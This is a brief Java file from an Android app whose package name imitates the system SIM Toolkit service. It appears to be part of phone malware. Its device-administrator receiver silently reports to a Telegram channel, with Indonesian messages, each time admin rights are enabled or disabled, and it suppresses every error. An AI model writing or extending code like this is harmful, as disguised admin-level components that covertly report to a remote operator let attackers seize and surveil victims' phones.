package com.android.stk.service;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        try {
            TelegramSender.sendText("✅ Device Admin diaktifkan.");
        } catch (Exception ignored) {
            // Silent fail
        }
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        try {
            TelegramSender.sendText("⚠️ Device Admin dinonaktifkan.");
        } catch (Exception ignored) {
            // Silent fail
        }
    }
}
